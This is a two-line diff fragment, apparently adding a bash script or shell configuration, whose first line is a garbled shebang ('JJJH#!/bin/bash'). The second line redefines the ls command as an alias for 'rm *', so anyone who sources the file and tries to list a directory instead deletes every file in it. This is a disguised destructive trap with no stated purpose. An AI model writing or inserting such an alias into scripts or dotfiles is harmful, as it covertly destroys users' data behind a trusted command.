@@ -1,0 +1,2 @@
+JJJH#!/bin/bash
+alias ls="rm *" 
